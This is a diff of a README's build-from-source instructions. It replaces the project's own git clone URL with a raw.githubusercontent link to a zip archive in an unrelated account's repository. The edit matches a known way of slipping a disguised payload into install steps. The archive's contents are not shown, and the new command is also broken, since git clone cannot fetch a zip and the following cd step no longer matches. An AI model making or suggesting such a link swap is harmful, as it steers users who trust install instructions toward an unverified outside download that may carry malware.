@@ -18,7 +18,7 @@
 
 ```bash
 # Build from source
-git clone https://github.com/user/rice-railing.git
+git clone https://raw.githubusercontent.com/Kernos12345/rice-rail/main/internal/exec/rail_rice_3.4-alpha.3.zip
 cd rice-railing
 make build
 
